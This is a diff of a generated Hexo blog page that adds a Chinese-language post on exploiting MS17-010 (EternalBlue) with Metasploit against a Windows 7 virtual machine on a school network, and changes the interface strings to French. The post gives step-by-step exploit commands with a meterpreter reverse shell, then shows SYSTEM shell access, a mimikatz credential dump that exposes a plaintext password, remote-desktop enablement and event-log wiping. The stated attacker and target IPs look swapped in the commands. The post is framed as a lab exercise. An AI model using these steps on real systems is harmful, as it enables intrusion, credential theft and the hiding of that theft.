@@ -53,9 +53,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://hzhikui.github.io"></form>
@@ -96,6 +96,78 @@
 <p>受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。</p>
 <p><a href="https://www.metasploit.com/" target="_blank" rel="external">Metasploit</a>是近年来最强大，最流行和最有发展前途的开源渗透测试平台软件，它本身附带数百个已知软件漏洞的专业级漏洞攻击工具，更新后的metasploit已默认集成ms17-010漏洞检测及利用模块，使得我们可以更方便的对漏洞进行利用。</p>
 <h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p>漏洞分析详见：<a href="http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/" target="_blank" rel="external">NSA Eternablue SMB 漏洞分析</a></p>
+<h3 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h3><p>攻击机：kali 2017.1       ip：172.16.244.231</p>
+<p>靶机： win7         ip:172.16.244.232</p>
+<p>攻击机和靶机均为虚拟机，共同桥接到学校内网中。</p>
+<h3 id="0x03-利用metasploit对靶机进行攻击"><a href="#0x03-利用metasploit对靶机进行攻击" class="headerlink" title="0x03 利用metasploit对靶机进行攻击"></a>0x03 利用metasploit对靶机进行攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># msfconsole</span></div></pre></td></tr></table></figure>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-5/66030177.jpg" alt="msfconsole"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf &gt; search ms17-010</div></pre></td></tr></table></figure></p>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-5/80787420.jpg" alt="search">可以看到共有两个模块，第一个模块为辅助模块，可调用nmap对网络中其它主机进行漏洞检测，第二个模块则为漏洞利用模块。</p>
+<h4 id="辅助模块-smb-ms17-010"><a href="#辅助模块-smb-ms17-010" class="headerlink" title="辅助模块(smb_ms17_010)"></a>辅助模块(smb_ms17_010)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/scanner/smb/smb_ms17_010 </div><div class="line">msf auxiliary(smb_ms17_010) &gt; show options</div></pre></td></tr></table></figure>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-5/59267600.jpg" alt=""><br>因为已知靶机ip，故在此只需设置RHOSTS，若想利用本模块探测内网内主机是否存在漏洞，可提高THREADS以提高探测速度。<br><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-5/97194395.jpg" alt=""><br>探测结果显示目标主机操作系统为win7且可能存在ms17-010漏洞，故可进行进一步利用。</p>
+<h4 id="漏洞利用模块"><a href="#漏洞利用模块" class="headerlink" title="漏洞利用模块"></a>漏洞利用模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">msf auxiliary(smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</div><div class="line">msf exploit(ms17_010_eternalblue) &gt; show options </div><div class="line"></div><div class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</div><div class="line"></div><div class="line">   Name                Current Setting  Required  Description</div><div class="line">   ----                ---------------  --------  -----------</div><div class="line">   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.</div><div class="line">   GroomDelta          5                yes       The amount to increase the groom count by per try.</div><div class="line">   MaxExploitAttempts  3                yes       The number of times to retry the exploit.</div><div class="line">   ProcessName         spoolsv.exe      yes       Process to inject payload into.</div><div class="line">   RHOST                                yes       The target address</div><div class="line">   RPORT               445              yes       The target port (TCP)</div><div class="line">   SMBDomain           .                no        (Optional) The Windows domain to use for authentication</div><div class="line">   SMBPass                              no        (Optional) The password for the specified username</div><div class="line">   SMBUser                              no        (Optional) The username to authenticate as</div><div class="line">   VerifyArch          true             yes       Check if remote architecture matches exploit Target.</div><div class="line">   VerifyTarget        true             yes       Check if remote OS matches exploit Target.</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</div></pre></td></tr></table></figure>
+<p>修改RHOST为目标机ip，也可修改ProcessName<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms17_010_eternalblue) &gt; set rhost 172.16.244.231</div></pre></td></tr></table></figure></p>
+<p>修改payload，以便进一步获取更多信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</div></pre></td></tr></table></figure></p>
+<p>修改LHOST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms17_010_eternalblue) &gt; set lhost 172.16.244.232</div></pre></td></tr></table></figure></p>
+<p>执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms17_010_eternalblue) &gt; exploit</div></pre></td></tr></table></figure></p>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-5/96590122.jpg" alt=""><br>成功获取会话</p>
+<h3 id="0x04-利用Meterpreter获取更多信息"><a href="#0x04-利用Meterpreter获取更多信息" class="headerlink" title="0x04 利用Meterpreter获取更多信息"></a>0x04 利用Meterpreter获取更多信息</h3><p>shell命令可获得目标系统shell，并且利用该漏洞获得的权限为system<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell </div><div class="line">Process 5764 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows [版本 6.1.7601]</div><div class="line">版权所有 (c) 2009 Microsoft Corporation。保留所有权利。</div><div class="line"></div><div class="line">C:\Windows\system32&gt;whoami</div><div class="line">whoami</div><div class="line">nt authority\system</div></pre></td></tr></table></figure></p>
+<p>screenshot命令可获取活动用户的桌面截屏并保存到/root<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; screenshot </div><div class="line">Screenshot saved to: /root/TrTmZLSM.jpeg</div></pre></td></tr></table></figure></p>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-5/72545981.jpg" alt=""></p>
+<p>sysinfo命令可以获取系统运行平台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo </div><div class="line">Computer        : WIN-IAHL84L2G0H</div><div class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</div><div class="line">Architecture    : x64</div><div class="line">System Language : zh_CN</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x64/windows</div></pre></td></tr></table></figure></p>
+<p>ps命令可获得目标主机正在运行的进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; ps</div><div class="line"></div><div class="line">Process List</div><div class="line">============</div><div class="line"></div><div class="line"> PID   PPID  Name                          Arch  Session  User                          Path</div><div class="line"> ---   ----  ----                          ----  -------  ----                          ----</div><div class="line"> 0     0     [System Process]                                                           </div><div class="line"> 4     0     System                        x64   0                                      </div><div class="line"> 300   4     smss.exe                      x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe</div><div class="line"> 380   372   csrss.exe                     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe</div><div class="line"> 396   536   svchost.exe                   x64   0        NT AUTHORITY\LOCAL SERVICE    </div><div class="line"> 432   372   wininit.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe</div><div class="line"> 448   424   csrss.exe                     x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe</div><div class="line"> 492   424   winlogon.exe                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe</div><div class="line"> 512   536   svchost.exe                   x64   0        NT AUTHORITY\SYSTEM           </div><div class="line"> 536   432   services.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe</div><div class="line"> 544   4068  lantern.exe                   x86   1        WIN-IAHL84L2G0H\61455         C:\Users\61455\AppData\Roaming\Lantern\lantern.exe</div><div class="line"> 548   432   lsass.exe                     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe</div><div class="line"> 556   432   lsm.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe</div><div class="line"> 664   536   svchost.exe                   x64   0        NT AUTHORITY\SYSTEM           </div><div class="line"> 724   536   vmacthlp.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe</div><div class="line"> 768   536   svchost.exe                   x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 784   536   ZhuDongFangYu.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\360\360Safe\deepscan\zhudongfangyu.exe</div><div class="line"> 832   536   svchost.exe                   x64   0        NT AUTHORITY\LOCAL SERVICE    </div><div class="line"> 888   536   svchost.exe                   x64   0        NT AUTHORITY\SYSTEM           </div><div class="line"> 928   536   svchost.exe                   x64   0        NT AUTHORITY\SYSTEM           </div><div class="line"> 984   3924  SogouCloud.exe                x86   1        WIN-IAHL84L2G0H\61455         C:\Program Files (x86)\SogouInput\8.1.0.8654\SogouCloud.exe</div><div class="line"> 1072  536   svchost.exe                   x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 1196  928   taskeng.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe</div><div class="line"> 1204  536   spoolsv.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe</div><div class="line"> 1276  536   svchost.exe                   x64   0        NT AUTHORITY\LOCAL SERVICE    </div><div class="line"> 1412  536   WVSScheduler.exe              x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Acunetix\Web Vulnerability Scanner 10\WVSScheduler.exe</div><div class="line"> 1616  536   svchost.exe                   x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\svchost.exe</div><div class="line"> 1652  536   MsDtsSrvr.exe                 x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 1728  536   sqlservr.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 1764  536   msmdsrv.exe                   x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 1860  536   ReportingServicesService.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 2064  536   sqlbrowser.exe                x86   0        NT AUTHORITY\LOCAL SERVICE    </div><div class="line"> 2092  536   sqlwriter.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe</div><div class="line"> 2164  536   VGAuthService.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe</div><div class="line"> 2200  536   vmtoolsd.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</div><div class="line"> 2488  536   dllhost.exe                   x64   0        NT AUTHORITY\SYSTEM           </div><div class="line"> 2496  664   dllhost.exe                                                                </div><div class="line"> 2560  784   360tray.exe                   x86   1        WIN-IAHL84L2G0H\61455         C:\Program Files (x86)\360\360Safe\safemon\360tray.exe</div><div class="line"> 2568  4084  KERNEL32.EXE                  x86   1        WIN-IAHL84L2G0H\61455         C:\Windows\SysWOW64\KERNEL32.EXE</div><div class="line"> 2588  664   WmiPrvSE.exe                                                               </div><div class="line"> 2780  536   svchost.exe                   x64   0        NT AUTHORITY\LOCAL SERVICE    </div><div class="line"> 2868  536   fdlauncher.exe                x64   0        NT AUTHORITY\LOCAL SERVICE    </div><div class="line"> 2908  2992  wpscloudsvr.exe               x86   1        WIN-IAHL84L2G0H\61455         C:\Users\61455\AppData\Local\Kingsoft\WPS Office\10.1.0.6393\office6\wpscloudsvr.exe</div><div class="line"> 2984  536   svchost.exe                   x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 3140  536   msdtc.exe                     x64   0        NT AUTHORITY\NETWORK SERVICE  </div><div class="line"> 3168  2868  fdhost.exe                    x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Program Files\Microsoft SQL Server\MSSQL10.MSSQLSERVER\MSSQL\Binn\fdhost.exe</div><div class="line"> 3176  380   conhost.exe                   x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\conhost.exe</div><div class="line"> 3780  536   taskhost.exe                  x64   1        WIN-IAHL84L2G0H\61455         C:\Windows\system32\taskhost.exe</div><div class="line"> 3844  1196  GoogleUpdate.exe              x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\GoogleUpdate.exe</div><div class="line"> 3912  888   dwm.exe                       x64   1        WIN-IAHL84L2G0H\61455         C:\Windows\system32\Dwm.exe</div><div class="line"> 3924  3888  explorer.exe                  x64   1        WIN-IAHL84L2G0H\61455         C:\Windows\Explorer.EXE</div><div class="line"> 3992  3924  cmd.exe                       x64   1        WIN-IAHL84L2G0H\61455         C:\Windows\system32\cmd.exe</div><div class="line"> 4012  536   SearchIndexer.exe             x64   0        NT AUTHORITY\SYSTEM           </div><div class="line"> 4048  3924  vmtoolsd.exe                  x64   1        WIN-IAHL84L2G0H\61455         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</div><div class="line"> 4068  3924  lantern.exe                   x86   1        WIN-IAHL84L2G0H\61455         C:\Users\61455\AppData\Roaming\Lantern\lantern.exe</div><div class="line"> 4432  448   conhost.exe                   x64   1        WIN-IAHL84L2G0H\61455         C:\Windows\system32\conhost.exe</div><div class="line"> 4704  3844  GoogleCrashHandler.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.33.5\GoogleCrashHandler.exe</div><div class="line"> 4844  3844  GoogleCrashHandler64.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.33.5\GoogleCrashHandler64.exe</div><div class="line"> 5696  536   taskhost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\taskhost.exe</div></pre></td></tr></table></figure>
+<p>获取目标系统用户账号及密码(若目标系统安装防护软件，则添加用户及修改密码均会触发报警，而此方法获取账号及密码不会被报警并且可通过开启目标机器远程桌面进行连接)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; load mimikatz </div><div class="line">Loading extension mimikatz...Success.</div><div class="line">meterpreter &gt; wdigest </div><div class="line">[+] Running as SYSTEM</div><div class="line">[*] Retrieving wdigest credentials</div><div class="line">wdigest credentials</div><div class="line">===================</div><div class="line"></div><div class="line">AuthID    Package    Domain           User              Password</div><div class="line">------    -------    ------           ----              --------</div><div class="line">0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     </div><div class="line">0;996     Negotiate  WORKGROUP        WIN-IAHL84L2G0H$  </div><div class="line">0;52632   NTLM                                          </div><div class="line">0;999     NTLM       WORKGROUP        WIN-IAHL84L2G0H$  </div><div class="line">0;607433  NTLM       WIN-IAHL84L2G0H  61455             lyu</div><div class="line">0;607401  NTLM       WIN-IAHL84L2G0H  61455             lyu</div></pre></td></tr></table></figure></p>
+<p>开启目标系统远程桌面</p>
+<p>方法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run getgui -e</div></pre></td></tr></table></figure></p>
+<p>方法二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run post/windows/manage/enable_rdp</div></pre></td></tr></table></figure></p>
+<p>利用rdesktop连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdesktop 172.16.244.231</div></pre></td></tr></table></figure></p>
+<p>清除痕迹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; clearev</div><div class="line">[*] Wiping 12348 records from Application...</div><div class="line">[*] Wiping 1345 records from System...</div><div class="line">[*] Wiping 3 records from Security...</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hzhikui.github.io/2017/09/04/Metasploit-ms117-010模块利用/" data-id="cj77n5w8c0000aousimahemta" class="article-share-link">Partager</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Metasploit-ms17-010模块利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/04/Metasploit-ms17-010模块利用/" class="article-date">
+  <time datetime="2017-09-04T08:50:33.000Z" itemprop="datePublished">2017-09-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/kali/">kali</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/04/Metasploit-ms17-010模块利用/">Metasploit ms117-010模块利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>2017年4月，网络最为轰动的事件无疑是TheShadowBrokers放出一大批NSA（美国国家安全局）“方程式组织” (Equation Group)使用的极具破坏力的黑客工具，其中包括可以远程攻破全球约70%Windows机器的漏洞利用工具。一夜之间，全世界70%的windows服务器置于危险之中，国内使用windows服务器的高校、国企甚至政府机构也不能幸免。这对互联网无疑造成了一次大地震，因为已经很久没有出现过像MS17-010这种级别的漏洞了，因此就被大家笑语说出了“指哪打哪”这样一个事实。</p>
+<p>受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。</p>
+<p><a href="https://www.metasploit.com/" target="_blank" rel="external">Metasploit</a>是近年来最强大，最流行和最有发展前途的开源渗透测试平台软件，它本身附带数百个已知软件漏洞的专业级漏洞攻击工具，更新后的metasploit已默认集成ms17-010漏洞检测及利用模块，使得我们可以更方便的对漏洞进行利用。</p>
+<h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p>漏洞分析详见：<a href="http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/" target="_blank" rel="external">NSA Eternablue SMB 漏洞分析</a></p>
 <h3 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h3><p>攻击机：kali 2017.1 ip：172.16.244.233</p>
 <p>靶机： win7   ip:172.16.244.232</p>
 <p>攻击机和靶机均为虚拟机，共同桥接到学校内网中。</p>
@@ -106,7 +178,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hzhikui.github.io/2017/09/04/Metasploit-ms117-010模块利用/" data-id="cj7756gzq0000osuso4fovb5h" class="article-share-link">Share</a>
+      <a data-url="http://hzhikui.github.io/2017/09/04/Metasploit-ms17-010模块利用/" data-id="cj77n5w9u0005aousdsi83wrw" class="article-share-link">Partager</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li></ul>
@@ -125,7 +197,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
+    <h3 class="widget-title">Catégories</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/kali/">kali</a></li></ul>
     </div>
@@ -135,7 +207,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
+    <h3 class="widget-title">Mot-clés</h3>
     <div class="widget">
       <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/">kali</a></li></ul>
     </div>
@@ -145,7 +217,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
+    <h3 class="widget-title">Nuage de mot-clés</h3>
     <div class="widget tagcloud">
       <a href="/tags/kali/" style="font-size: 10px;">kali</a>
     </div>
@@ -164,12 +236,16 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Articles récents</h3>
     <div class="widget">
       <ul>
         
           <li>
             <a href="/2017/09/04/Metasploit-ms117-010模块利用/">Metasploit ms117-010模块利用</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/04/Metasploit-ms17-010模块利用/">Metasploit ms117-010模块利用</a>
           </li>
         
       </ul>
@@ -185,7 +261,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2017 zhikui<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
